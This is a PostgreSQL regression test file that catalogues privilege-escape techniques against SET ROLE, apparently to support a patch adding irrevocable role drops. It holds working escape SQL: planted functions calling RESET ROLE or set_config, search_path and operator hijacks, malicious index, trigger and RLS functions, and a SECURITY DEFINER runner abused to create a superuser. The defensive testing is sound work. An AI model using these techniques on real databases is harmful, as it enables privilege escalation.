--
-- role_escapes
--
-- Catalogue of attacks against SET ROLE / SET SESSION AUTHORIZATION as
-- privilege boundaries in unpatched PostgreSQL.  Each test sets up a
-- realistic scenario, performs SET ROLE to a low-privilege role, and
-- demonstrates that the privileged identity is reachable again, or
-- that attacker-controlled code is executed under the privileged
-- identity.
--
-- THE EXPECTED OUTPUT OF THIS FILE DOCUMENTS WEAKNESSES IN ROLE
-- MANAGEMENT, NOT CORRECTNESS.
--
-- Two flavours of evidence appear in the expected output:
--   1. "current_user = regress_role_high" after a "SET ROLE
--      regress_role_low" — direct rollback/restoration class.
--   2. "NOTICE:  ran as regress_role_high" from a function planted by
--      regress_role_low — the function is being invoked under
--      writer-privilege context (functional index, CHECK, DEFAULT,
--      RLS, etc.).
--
-- ----------------------------------------------------------------
-- Classification by the irrevocable-privilege-drop patch
-- ----------------------------------------------------------------
-- LOCK  = will be blocked by an authorization lock installed via
--         SET ROLE x IRREVOCABLE or SET ROLE x WITH COOKIE.  The
--         two lock kinds offer the same in-session protection
--         against escape — they differ only in whether a single
--         legitimate unlock is possible (COOKIE) or impossible
--         (IRREVOCABLE).  See design §5.1.  All escape vectors
--         categorised here treat the two kinds identically.
-- OTHER = requires hardening orthogonal to the lock (search_path
--         discipline, SECDEF audit, etc.); listed here because the
--         shared problem is "SET ROLE is not a sound isolation
--         boundary"
--
--   A.  Direct restoration class       — LOCK
--   B.  GUC rollback class             — LOCK
--   C.  search_path hijack             — LOCK helps reduce damage
--                                         (attacker can no longer
--                                         RESET ROLE inside hijacked
--                                         function), but the function
--                                         still runs as writer;
--                                         needs schema/search_path
--                                         discipline
--   D.  Object-definition triggers     — OTHER (function runs as
--                                         writer; the lock doesn't
--                                         prevent this — the writer
--                                         hasn't dropped privilege.
--                                         The lesson is that
--                                         high-priv users must avoid
--                                         touching low-owned objects
--                                         whose definitions contain
--                                         attacker-controlled
--                                         functions.)
--   E.  SECURITY DEFINER lent back     — LOCK if the SECDEF body does
--                                         a SET ROLE the caller's
--                                         lock should clip
--   F.  Connection-state escape        — LOCK
--   G.  Catalog-driven invocation      — OTHER (similar to D)
--
-- No "PROTO" classification (protocol-level role management, design
-- §16) appears here.  PROTO is not a different *enforcement* tier —
-- it routes the SAME AuthLock primitives through a wire-protocol
-- channel that bypasses the SQL parser/executor/logging.  Every
-- escape vector in this file is reached via SQL execution *inside*
-- an already-established session; the lock's in-session enforcement
-- (Layer 1 chokepoint clip + Layer 2 user-visible refusal) blocks
-- them all regardless of whether the lock was installed via SQL or
-- via a protocol message.
--
-- The benefits PROTO adds are about the *channel between pooler
-- and backend*, not about in-session escape:
--   * Pooler's privilege-management bytes cannot be smuggled into
--     by tenant-controlled SQL (different wire-protocol layer).
--   * Role name is never visible to log_statement / pg_stat_statements
--     / auto_explain.
--   * Privilege ops have no Parse/Bind/Describe lifecycle and so
--     cannot be re-bound via extended-query.
-- These belong in a pooler-channel-hardening test suite (not yet
-- written), not in this in-session escape catalogue.
-- ----------------------------------------------------------------

\set VERBOSITY terse

-- ============================================================
-- Test bed
-- ============================================================

CREATE ROLE regress_role_high SUPERUSER;
CREATE ROLE regress_role_low NOSUPERUSER NOCREATEDB NOCREATEROLE NOINHERIT;
CREATE ROLE regress_role_other NOSUPERUSER NOCREATEDB NOCREATEROLE NOINHERIT;
GRANT regress_role_low TO regress_role_high;
GRANT regress_role_other TO regress_role_high;

CREATE SCHEMA regress_high_schema AUTHORIZATION regress_role_high;
GRANT USAGE ON SCHEMA regress_high_schema TO regress_role_low;
CREATE SCHEMA regress_low_schema  AUTHORIZATION regress_role_low;
GRANT USAGE ON SCHEMA regress_low_schema TO PUBLIC;
GRANT CREATE ON SCHEMA regress_low_schema TO regress_role_low;

SET SESSION AUTHORIZATION regress_role_high;
SELECT current_user;


-- ============================================================
-- A.  Direct privilege restoration  [LOCK]
-- ============================================================

-- A1.  Function body calls RESET ROLE.
CREATE FUNCTION regress_low_schema.escape_via_reset() RETURNS name
LANGUAGE plpgsql AS $$
BEGIN
    RESET ROLE;
    RETURN current_user;
END;
$$;
ALTER FUNCTION regress_low_schema.escape_via_reset() OWNER TO regress_role_low;

SET ROLE regress_role_low;
SELECT regress_low_schema.escape_via_reset() AS inside_function_returned;
SELECT current_user AS after_function_returns;       -- regress_role_high  [ESCAPE]
RESET ROLE;

-- A2.  Function body calls SET ROLE NONE.
CREATE FUNCTION regress_low_schema.escape_via_set_none() RETURNS name
LANGUAGE plpgsql AS $$
BEGIN
    SET ROLE NONE;
    RETURN current_user;
END;
$$;
ALTER FUNCTION regress_low_schema.escape_via_set_none() OWNER TO regress_role_low;

SET ROLE regress_role_low;
SELECT regress_low_schema.escape_via_set_none();     -- regress_role_high  [ESCAPE]
RESET ROLE;

-- A3.  SET ROLE to a sibling role the session_user is a member of.
CREATE FUNCTION regress_low_schema.escape_to_sibling() RETURNS name
LANGUAGE plpgsql AS $$
BEGIN
    SET ROLE regress_role_other;
    RETURN current_user;
END;
$$;
ALTER FUNCTION regress_low_schema.escape_to_sibling() OWNER TO regress_role_low;

SET ROLE regress_role_low;
SELECT regress_low_schema.escape_to_sibling();       -- regress_role_other  [ESCAPE]
RESET ROLE;

-- A4.  Function body changes session_authorization.
CREATE FUNCTION regress_low_schema.escape_via_set_sess_auth() RETURNS name
LANGUAGE plpgsql AS $$
BEGIN
    SET SESSION AUTHORIZATION regress_role_high;
    RETURN current_user;
END;
$$;
ALTER FUNCTION regress_low_schema.escape_via_set_sess_auth() OWNER TO regress_role_low;

SET ROLE regress_role_low;
SELECT regress_low_schema.escape_via_set_sess_auth();   -- regress_role_high  [ESCAPE]
RESET ROLE;
RESET SESSION AUTHORIZATION;
SET SESSION AUTHORIZATION regress_role_high;


-- ============================================================
-- B.  GUC rollback class  [LOCK]
-- ============================================================

-- B1.  SET LOCAL ROLE undone by transaction abort.
BEGIN;
SET LOCAL ROLE regress_role_low;
SELECT current_user AS inside_after_set_local;      -- regress_role_low
DO $$ BEGIN RAISE EXCEPTION 'attacker triggers rollback'; END $$;
ROLLBACK;
SELECT current_user AS after_rollback;              -- regress_role_high  [ESCAPE]

-- B2.  Outer non-LOCAL SET ROLE survives transaction abort (safe direction).
SET ROLE regress_role_low;
BEGIN;
SELECT current_user AS inside_after_begin;          -- regress_role_low
DO $$ BEGIN RAISE EXCEPTION 'still rolls back'; END $$;
ROLLBACK;
SELECT current_user AS after_outer_rollback;        -- regress_role_low (safe)
RESET ROLE;

-- B3.  SET LOCAL inside SAVEPOINT, ROLLBACK TO undoes the drop.
BEGIN;
SAVEPOINT sp_attack;
SET LOCAL ROLE regress_role_low;
SELECT current_user AS inside_savepoint;            -- regress_role_low
DO $$ BEGIN RAISE EXCEPTION 'savepoint rewind'; END $$;
ROLLBACK TO SAVEPOINT sp_attack;
SELECT current_user AS after_sp_rollback;           -- regress_role_high  [ESCAPE]
RELEASE SAVEPOINT sp_attack;
COMMIT;

-- B4.  SAVEPOINT RELEASE does not rewind (safe direction).
BEGIN;
SAVEPOINT sp_b4;
SET LOCAL ROLE regress_role_low;
SELECT current_user;                                -- regress_role_low
RELEASE SAVEPOINT sp_b4;
SELECT current_user;                                -- regress_role_low (safe)
COMMIT;
SELECT current_user;                                -- regress_role_high (SET LOCAL ended)


-- ============================================================
-- C.  search_path hijack  [LOCK partially / OTHER]
-- ============================================================

-- C1.  Function-name shadowing.
CREATE FUNCTION regress_low_schema.length(text) RETURNS int
LANGUAGE plpgsql AS $$
BEGIN
    RAISE NOTICE 'C1: hijacked length() ran as %', current_user;
    RESET ROLE;
    RETURN pg_catalog.length($1);
END;
$$;
ALTER FUNCTION regress_low_schema.length(text) OWNER TO regress_role_low;

SET ROLE regress_role_low;
SET search_path = regress_low_schema, pg_catalog;
SELECT length('abc');                                -- attacker length() runs
SELECT current_user;                                 -- regress_role_high  [ESCAPE]
RESET ROLE;
RESET search_path;

-- C2.  Operator resolution.
CREATE FUNCTION regress_low_schema.evil_eq(int, int) RETURNS boolean
LANGUAGE plpgsql AS $$
BEGIN
    RAISE NOTICE 'C2: hijacked === ran as %', current_user;
    RESET ROLE;
    RETURN $1 = $2;
END;
$$;
ALTER FUNCTION regress_low_schema.evil_eq(int,int) OWNER TO regress_role_low;

CREATE OPERATOR regress_low_schema.=== (
    LEFTARG = int, RIGHTARG = int,
    FUNCTION = regress_low_schema.evil_eq
);
ALTER OPERATOR regress_low_schema.===(int,int) OWNER TO regress_role_low;

SET ROLE regress_role_low;
SET search_path = regress_low_schema, pg_catalog;
SELECT 1 OPERATOR(regress_low_schema.===) 1;
SELECT current_user;                                 -- regress_role_high  [ESCAPE]
RESET ROLE;
RESET search_path;

-- C3.  Custom-type input function hijack.
--      Attacker creates a domain whose input/check function runs as
--      the user that supplies a value of that type.

SET ROLE regress_role_low;
CREATE FUNCTION regress_low_schema.dom_check_fn(int) RETURNS boolean
LANGUAGE plpgsql AS $$
BEGIN
    RAISE NOTICE 'C3: domain check ran as %', current_user;
    RESET ROLE;
    RETURN true;
END;
$$;
CREATE DOMAIN regress_low_schema.evilint AS int
    CONSTRAINT chk CHECK (regress_low_schema.dom_check_fn(VALUE));
GRANT USAGE ON DOMAIN regress_low_schema.evilint TO regress_role_high;
RESET ROLE;

SET ROLE regress_role_low;
DO $$
DECLARE v regress_low_schema.evilint;
BEGIN
    v := 5;
END;
$$;
SELECT current_user;                                 -- regress_role_high  [ESCAPE]
RESET ROLE;


-- ============================================================
-- D.  Object-definition triggers  [OTHER]
--
-- The privileged caller (high) performs a routine operation on a
-- low-owned object whose definition contains attacker code.  Many of
-- these contexts (functional indexes, CHECK constraints, generated
-- columns, RLS quals, domain checks) run under
-- SECURITY_RESTRICTED_OPERATION which BLOCKS SET/RESET — that's
-- existing hardening.  But the function still runs as the writer, so
-- the attacker still gets writer-privilege code execution; we prove
-- it with RAISE NOTICE.
--
-- IRREVOCABLE does NOT block this class: the writer hasn't dropped
-- privileges.  The defensive lesson is that high-priv sessions must
-- not touch low-owned objects whose definitions reference functions
-- they cannot audit.
-- ============================================================

-- D1.  Functional index.
SET ROLE regress_role_low;
CREATE TABLE regress_low_schema.victim_t (x int);
CREATE FUNCTION regress_low_schema.idx_fn(int) RETURNS int
LANGUAGE plpgsql IMMUTABLE AS $$
BEGIN
    RAISE NOTICE 'D1: functional-index expression ran as %', current_user;
    RETURN $1;
END;
$$;
CREATE INDEX victim_idx ON regress_low_schema.victim_t (regress_low_schema.idx_fn(x));
GRANT INSERT ON regress_low_schema.victim_t TO regress_role_high;
RESET ROLE;

INSERT INTO regress_low_schema.victim_t VALUES (1);  -- NOTICE: ran as regress_role_high
SELECT count(*) FROM regress_low_schema.victim_t;

-- D2.  CHECK constraint.
SET ROLE regress_role_low;
CREATE FUNCTION regress_low_schema.check_fn(int) RETURNS boolean
LANGUAGE plpgsql IMMUTABLE AS $$
BEGIN
    RAISE NOTICE 'D2: CHECK constraint ran as %', current_user;
    RETURN $1 IS NOT NULL;
END;
$$;
CREATE TABLE regress_low_schema.victim_check (
    x int CHECK (regress_low_schema.check_fn(x))
);
GRANT INSERT ON regress_low_schema.victim_check TO regress_role_high;
RESET ROLE;

INSERT INTO regress_low_schema.victim_check VALUES (1);   -- NOTICE shows writer

-- D3.  DEFAULT expression (VOLATILE allowed here).
SET ROLE regress_role_low;
CREATE FUNCTION regress_low_schema.default_fn() RETURNS int
LANGUAGE plpgsql AS $$
BEGIN
    RAISE NOTICE 'D3: DEFAULT expression ran as %', current_user;
    RESET ROLE;   -- VOLATILE: actually clobbers session role
    RETURN 42;
END;
$$;
CREATE TABLE regress_low_schema.victim_default (
    id int,
    y  int DEFAULT regress_low_schema.default_fn()
);
GRANT INSERT ON regress_low_schema.victim_default TO regress_role_high;
RESET ROLE;

INSERT INTO regress_low_schema.victim_default (id) VALUES (1);
SELECT current_user;                                 -- regress_role_high  [ESCAPE]

-- D4.  Trigger function planted by low, fired by writer DML.
--      Modern PG runs trigger functions as the function *owner* (low),
--      so the body executes as low.  BUT: check_role() validates SET
--      ROLE permission against the *session_user*, not the
--      current_user.  Since the session_user remains the originally
--      authenticated identity (high / superuser), set_config('role',
--      'high', false) inside the trigger body succeeds and persists
--      past trigger return — the attacker has clobbered the session's
--      role via session_user's membership.
SET ROLE regress_role_low;
CREATE FUNCTION regress_low_schema.trg_fn() RETURNS trigger
LANGUAGE plpgsql AS $$
BEGIN
    RAISE NOTICE 'D4: trigger body ran as %', current_user;
    PERFORM set_config('role', 'regress_role_high', false);
    RETURN NEW;
END;
$$;
CREATE TABLE regress_low_schema.victim_trg (x int);
CREATE TRIGGER t BEFORE INSERT ON regress_low_schema.victim_trg
    FOR EACH ROW EXECUTE FUNCTION regress_low_schema.trg_fn();
GRANT INSERT ON regress_low_schema.victim_trg TO regress_role_high;
RESET ROLE;

SET ROLE regress_role_low;
INSERT INTO regress_low_schema.victim_trg VALUES (1);
SELECT current_user;                                 -- regress_role_high  [ESCAPE]
RESET ROLE;

-- D5.  View body invokes attacker function.  Default views in PG are
--      security_invoker for the contained function calls, so when the
--      high-priv user SELECTs from a low-owned view, the attacker's
--      function runs as high — proven by NOTICE.  (Compare with PG 16+
--      `security_invoker = false` views, which run as view owner; the
--      DEFAULT is still invoker.)
SET ROLE regress_role_low;
CREATE FUNCTION regress_low_schema.view_fn() RETURNS int
LANGUAGE plpgsql AS $$
BEGIN
    RAISE NOTICE 'D5: view body ran as %', current_user;
    RETURN 1;
END;
$$;
CREATE VIEW regress_low_schema.victim_v AS
    SELECT regress_low_schema.view_fn() AS one;
GRANT SELECT ON regress_low_schema.victim_v TO PUBLIC;
RESET ROLE;

-- High (not lowered) SELECTs from the low-owned view.
SELECT * FROM regress_low_schema.victim_v;   -- NOTICE shows ran as high

-- D6.  RLS policy expression.  Runs under SECURITY_RESTRICTED_OPERATION,
--      so RESET ROLE is blocked, but the function still runs as the
--      querier — proven by NOTICE.
SET ROLE regress_role_low;
CREATE TABLE regress_low_schema.victim_rls (x int);
INSERT INTO regress_low_schema.victim_rls VALUES (1), (2);
ALTER TABLE regress_low_schema.victim_rls ENABLE ROW LEVEL SECURITY;
CREATE FUNCTION regress_low_schema.rls_fn(int) RETURNS boolean
LANGUAGE plpgsql AS $$
BEGIN
    RAISE NOTICE 'D6: RLS policy ran as %', current_user;
    RETURN true;
END;
$$;
CREATE POLICY p ON regress_low_schema.victim_rls
    USING (regress_low_schema.rls_fn(x));
GRANT SELECT ON regress_low_schema.victim_rls TO regress_role_other;
RESET ROLE;

-- Query as regress_role_other (non-owner, non-superuser) so RLS
-- actually applies.  RLS is bypassed for the table owner and for
-- superusers.
SET ROLE regress_role_other;
SELECT count(*) FROM regress_low_schema.victim_rls;  -- NOTICE shows querier
RESET ROLE;

-- D7.  Generated column expression.
SET ROLE regress_role_low;
CREATE FUNCTION regress_low_schema.gen_fn(int) RETURNS int
LANGUAGE plpgsql IMMUTABLE AS $$
BEGIN
    RAISE NOTICE 'D7: generated column ran as %', current_user;
    RETURN $1 * 2;
END;
$$;
CREATE TABLE regress_low_schema.victim_gen (
    x int,
    g int GENERATED ALWAYS AS (regress_low_schema.gen_fn(x)) STORED
);
GRANT INSERT ON regress_low_schema.victim_gen TO regress_role_high;
RESET ROLE;

INSERT INTO regress_low_schema.victim_gen (x) VALUES (3);  -- NOTICE shows writer

-- D8.  Domain CHECK constraint.
SET ROLE regress_role_low;
CREATE FUNCTION regress_low_schema.dom_fn(int) RETURNS boolean
LANGUAGE plpgsql IMMUTABLE AS $$
BEGIN
    RAISE NOTICE 'D8: domain CHECK ran as %', current_user;
    RETURN $1 > 0;
END;
$$;
CREATE DOMAIN regress_low_schema.posint AS int
    CONSTRAINT positive CHECK (regress_low_schema.dom_fn(VALUE));
GRANT USAGE ON DOMAIN regress_low_schema.posint TO regress_role_high;
RESET ROLE;

DO $$
DECLARE v regress_low_schema.posint;
BEGIN
    v := 5;
END;
$$;


-- ============================================================
-- E.  SECURITY DEFINER lent back to lowered context  [LOCK + OTHER]
-- ============================================================

-- E1.  SECDEF wrapper that EXECUTEs untrusted SQL passed by the
--      lowered caller.  The EXECUTE runs as the SECDEF owner (high =
--      superuser).
--
--      Existing PG hardening: SET / RESET of "role",
--      "session_authorization", and "search_path" is rejected inside
--      a SECURITY DEFINER function body with errcode "cannot set
--      parameter \"role\" within security-definer function".
--
--      But the SECDEF can still execute *other* privileged SQL on the
--      attacker's behalf.  Here we use CREATE ROLE: the attacker
--      causes the SECDEF to create a new superuser they control.
--      This is a lasting privilege escalation that survives the
--      session.

SET SESSION AUTHORIZATION regress_role_high;
CREATE FUNCTION regress_high_schema.secdef_runner(cmd text) RETURNS void
LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
    EXECUTE cmd;
END;
$$;
GRANT EXECUTE ON FUNCTION regress_high_schema.secdef_runner(text) TO regress_role_low;

SET ROLE regress_role_low;
-- First confirm the SET ROLE pathway IS blocked (existing hardening).
SELECT regress_high_schema.secdef_runner('SET ROLE regress_role_high');
-- Then demonstrate the equivalent escape via CREATE ROLE.
SELECT regress_high_schema.secdef_runner(
    'CREATE ROLE regress_role_evil SUPERUSER LOGIN PASSWORD ''hunter2''');
RESET ROLE;
-- Evidence: the role now exists, owned by no-one (i.e. by the SECDEF
-- owner's privileges), with SUPERUSER LOGIN.
SELECT rolname, rolsuper, rolcanlogin FROM pg_roles
    WHERE rolname = 'regress_role_evil';
DROP ROLE regress_role_evil;


-- ============================================================
-- F.  Connection-state escape  [LOCK]
-- ============================================================

-- F1.  DISCARD ALL.
SET ROLE regress_role_low;
SELECT current_user;
DISCARD ALL;
SELECT current_user;                                 -- regress_role_high  [ESCAPE]

-- F2.  RESET ALL.
--      Note: empirically RESET ALL does NOT clear the role GUC on
--      current master — role/session_authorization appear to be
--      exempt from RESET ALL.  Recorded as a near-miss; the same
--      attack via plain "RESET role" succeeds.
SET ROLE regress_role_low;
SELECT current_user AS before_reset_all;
RESET ALL;
SELECT current_user AS after_reset_all;              -- regress_role_low (not an escape)
RESET ROLE;

SET ROLE regress_role_low;
SELECT current_user AS before_reset_role;
RESET role;                                          -- lowercase: just the GUC
SELECT current_user AS after_reset_role;             -- regress_role_high  [ESCAPE]

-- F3.  set_config().
SET ROLE regress_role_low;
SELECT set_config('role', 'regress_role_high', false);
SELECT current_user;                                 -- regress_role_high  [ESCAPE]
RESET ROLE;


-- ============================================================
-- G.  Catalog-driven invocation  [OTHER]
-- ============================================================

-- G1.  Event trigger persistence.  Requires superuser to install;
--      once installed, fires on every DDL by every user.  This is
--      a *foothold* test, not a SET ROLE escape per se: it documents
--      that attacker code can be made to run on every DDL of the
--      cluster.

CREATE TABLE regress_low_schema.audit_log (
    at  timestamptz default now(),
    who name
);
GRANT INSERT, SELECT ON regress_low_schema.audit_log TO PUBLIC;
GRANT CREATE ON SCHEMA regress_low_schema TO regress_role_other;

-- Filter to only log DDL by our test roles, so concurrent parallel
-- tests don't make the audit_log row count non-deterministic.  The
-- escape class (event-trigger persistence + cross-session
-- surveillance) is still demonstrated within our test's sessions.
CREATE OR REPLACE FUNCTION regress_high_schema.ev_trg() RETURNS event_trigger
LANGUAGE plpgsql AS $$
BEGIN
    IF current_user IN ('regress_role_high', 'regress_role_low',
                        'regress_role_other') THEN
        INSERT INTO regress_low_schema.audit_log(who) VALUES (current_user);
    END IF;
END;
$$;
CREATE EVENT TRIGGER ev_t ON ddl_command_start
    EXECUTE FUNCTION regress_high_schema.ev_trg();

-- Any DDL by any user now logs current_user into a low-owned table.
SET ROLE regress_role_low;
CREATE TABLE regress_low_schema.tmp_for_ddl (x int);
DROP TABLE regress_low_schema.tmp_for_ddl;
RESET ROLE;
SET ROLE regress_role_other;
CREATE TABLE regress_low_schema.tmp_for_ddl2 (x int);
DROP TABLE regress_low_schema.tmp_for_ddl2;
RESET ROLE;

-- Attacker now reads the log to see who has been doing DDL.
SET ROLE regress_role_low;
SELECT who FROM regress_low_schema.audit_log ORDER BY at;
RESET ROLE;

DROP EVENT TRIGGER ev_t;

-- G2.  ANALYZE / VACUUM evaluating expression-index function.
--      Important hardening landmark observed in this output:
--      modern PG runs the expression-index function for ANALYZE under
--      the *table owner*'s identity, not the analyzing user's
--      (CVE-2023-5869 / related changes).  The empirical evidence
--      below shows INSERT-time evaluations ran as the WRITER (high),
--      but ANALYZE-time evaluations ran as the TABLE OWNER (low).
--      So in current PG the surviving escape via this surface is
--      "writer executes attacker IMMUTABLE code on INSERT", which we
--      already covered in D1.  Recorded here to document the
--      existing mitigation and to flag any future regression.

-- Re-create victim_t with a fresh notice-emitting expression index.
DROP TABLE IF EXISTS regress_low_schema.victim_t CASCADE;
SET ROLE regress_role_low;
CREATE TABLE regress_low_schema.victim_t (x int);
CREATE FUNCTION regress_low_schema.analyze_fn(int) RETURNS int
LANGUAGE plpgsql IMMUTABLE AS $$
BEGIN
    RAISE NOTICE 'G2: ANALYZE/index expression ran as %', current_user;
    RETURN $1;
END;
$$;
CREATE INDEX victim_t_idx ON regress_low_schema.victim_t (regress_low_schema.analyze_fn(x));
GRANT ALL ON regress_low_schema.victim_t TO regress_role_high;
RESET ROLE;

-- High inserts and ANALYZEs.  Use a small row count and suppress
-- NOTICE flood from per-row invocations during INSERT; the ANALYZE
-- invocation is the interesting one.
INSERT INTO regress_low_schema.victim_t SELECT g FROM generate_series(1,3) g;
ANALYZE regress_low_schema.victim_t;


-- ============================================================
-- TODO — vectors to cover in v2 (require multi-session / TAP):
--   - REFRESH MATERIALIZED VIEW evaluates view body as refresher
--   - Partition routing expression
--   - Logical-replication publication row filter
--   - CREATE STATISTICS ON expr
--   - Foreign-table CHECK / FDW handler / FDW validator
--   - Autovacuum-triggered expression evaluation
--   - Concurrent CREATE INDEX CONCURRENTLY by attacker on a table
--     the high-priv session has open
--   - Identity column sequence with attacker-owned sequence
--   - Custom RLS leakproof bypass via planner cost estimation
--   - LISTEN/NOTIFY-mediated cross-session role probing
-- ============================================================


-- ============================================================
-- Cleanup
-- ============================================================

SET SESSION AUTHORIZATION regress_role_high;
RESET ROLE;
DROP SCHEMA regress_low_schema CASCADE;
DROP SCHEMA regress_high_schema CASCADE;
RESET SESSION AUTHORIZATION;
DROP ROLE regress_role_other;
DROP ROLE regress_role_low;
DROP ROLE regress_role_high;
